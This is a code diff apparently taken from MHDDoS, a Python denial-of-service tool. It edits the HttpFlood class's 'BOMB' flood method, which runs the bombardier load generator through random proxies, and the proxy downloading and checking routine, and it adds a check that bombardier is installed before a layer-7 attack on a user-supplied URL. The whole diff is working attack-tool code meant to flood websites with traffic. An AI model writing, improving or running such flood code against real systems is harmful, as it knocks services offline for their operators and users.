@@ -841,7 +841,7 @@ class HttpFlood(Thread):
     def BOMB(self):
         pro = randchoice(self._proxies)
         run([
-            f'{Path.home() / "go/bin/bombardier"}',
+            f'{bombardier_path}',
             f'--connections={self._rpc}',
             '--http2',
             '--method=GET',
@@ -1158,11 +1158,8 @@ def get_proxies(proxy_li):
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         with proxy_li.open("w") as wr:
             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-            logger.info(
-                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
-            )
             Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=1, threads=threads,
+                Proxies, timeout=1, threads=min(100_000, len(Proxies)),
                 **({'url': url.human_repr()} if url else {})
             )
             if not Proxies:
@@ -1206,12 +1203,21 @@ if __name__ == '__main__':
                 event = Event()
                 event.clear()
                 target = None
+                bombardier_path = Path.home() / "go/bin/bombardier"
 
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" %
                          ", ".join(Methods.ALL_METHODS))
 
                 if method in Methods.LAYER7_METHODS:
+                    if method == "BOMB":
+                        assert (
+                            bombardier_path.exists()
+                            or bombardier_path.with_suffix('.exe').exists()
+                        ), (
+                            "Install bombardier: "
+                            "https://github.com/MHProDev/MHDDoS/blob/main/BOMBARDIER.md"
+                        )
                     urlraw = argv[2].strip()
                     if not urlraw.startswith("http"):
                         urlraw = "http://" + urlraw
